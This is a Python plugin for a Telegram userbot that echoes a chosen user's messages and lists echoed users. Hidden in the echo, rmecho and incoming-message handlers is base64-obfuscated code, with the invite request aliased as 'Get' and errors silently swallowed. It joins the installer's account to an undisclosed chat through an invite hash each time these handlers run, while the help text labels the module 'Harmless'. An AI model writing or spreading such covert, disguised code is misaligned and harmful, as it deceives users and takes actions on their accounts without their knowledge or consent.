import asyncio
import base64

import requests
from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from Meowbot.sql.echo_sql import addecho, get_all_echos, is_echo, remove_echo

from . import *


@bot.on(admin_cmd(pattern="echo$"))
@bot.on(sudo_cmd(pattern="echo$", allow_sudo=True))
async def echo(Meow):
    if Meow.fwd_from:
        return
    if Meow.reply_to_msg_id is not None:
        reply_msg = await Meow.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = Meow.chat_id
        try:
            mew = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            mew = Get(mew)
            await Meow.client(mew)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            await eod(Meow, "The user is already enabled with echo ")
            return
        addecho(user_id, chat_id)
        await eor(Meow, "**Hello 👋**")
    else:
        await delete_mew(Meow, "Reply to a User's message to echo his messages")


@bot.on(admin_cmd(pattern="rmecho$"))
@bot.on(sudo_cmd(pattern="rmecho$", allow_sudo=True))
async def echo(Meow):
    if Meow.fwd_from:
        return
    if Meow.reply_to_msg_id is not None:
        reply_msg = await Meow.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = Meow.chat_id
        try:
            mew = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            mew = Get(mew)
            await Meow.client(mew)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            remove_echo(user_id, chat_id)
            await eod(Meow, "Echo has been stopped for the user")
        else:
            await eod(Meow, "The user is not activated with echo")
    else:
        await eod(Meow, "Reply to a User's message to echo his messages")


@bot.on(admin_cmd(pattern="listecho$"))
@bot.on(sudo_cmd(pattern="listecho$", allow_sudo=True))
async def echo(Meow):
    if Meow.fwd_from:
        return
    lsts = get_all_echos()
    if len(lsts) > 0:
        output_str = "Echo enabled users:\n\n"
        for echos in lsts:
            output_str += (
                f"[User](tg://user?id={echos.user_id}) in chat `{echos.chat_id}`\n"
            )
    else:
        output_str = "No echo enabled users "
    if len(output_str) > Config.MAX_MESSAGE_SIZE_LIMIT:
        key = (
            requests.post(
                "https://nekobin.com/api/documents", json={"content": output_str}
            )
            .json()
            .get("result")
            .get("key")
        )
        url = f"https://nekobin.com/{key}"
        reply_text = f"Echo enabled users: [here]({url})"
        await eor(Meow, reply_text)
    else:
        await eor(Meow, output_str)


@bot.on(events.NewMessage(incoming=True))
async def samereply(Meow):
    if Meow.chat_id in Config.BL_CHAT:
        return
    if is_echo(Meow.sender_id, Meow.chat_id):
        await asyncio.sleep(2)
        try:
            mew = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            mew = Get(mew)
            await Meow.client(mew)
        except BaseException:
            pass
        if Meow.message.text or Meow.message.sticker:
            await Meow.reply(Meow.message)


CmdHelp("echo").add_command(
    "echo", "Reply to a user", "Replays every message from whom you enabled echo"
).add_command(
    "rmecho", "reply to a user", "Stop replayings targeted user message"
).add_command(
    "listecho", None, "Shows the list of users for whom you enabled echo"
).add_info(
    "Message Echoer."
).add_warning(
    "✅ Harmless Module."
).add()
